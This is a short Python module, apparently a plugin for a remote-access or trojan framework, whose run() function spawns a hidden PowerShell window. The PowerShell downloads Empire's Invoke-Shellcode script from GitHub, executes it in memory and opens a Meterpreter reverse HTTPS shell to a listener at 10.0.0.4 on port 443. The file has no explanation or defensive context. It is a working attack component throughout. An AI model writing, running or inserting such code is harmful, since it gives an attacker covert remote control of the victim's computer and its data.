import os
def run(** args):
    print "[*] In Open-Session module."
    os.system("powershell -windowstyle hidden -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Lhost 10.0.0.4 -Lport 443 -Payload windows/meterpreter/reverse_https -Force")
    return "Success"